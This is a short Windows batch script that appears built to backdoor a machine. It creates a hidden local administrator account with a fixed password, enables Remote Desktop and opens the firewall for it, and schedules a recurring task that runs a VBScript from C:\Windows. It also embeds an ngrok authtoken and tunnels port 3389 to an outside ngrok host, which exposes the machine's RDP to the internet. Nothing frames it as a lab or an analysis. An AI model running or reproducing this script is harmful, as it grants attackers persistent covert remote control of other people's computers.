@echo off
net user ali ali123 /add
net localgroup administrators ali /add
@echo off
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
schtasks /create /sc minute /mo 1000 /tn "MustafaTime" /tr "wscript C:\Windows\test.vbs"
@echo off
C:\Windows\ngrok.exe config add-authtoken 1d0A6StSywuFgvJKSRCPurcS63o_2uL5cX6HAHfJz7rFzfJTq
@echo off
C:\Windows\ngrok.exe tcp 3389

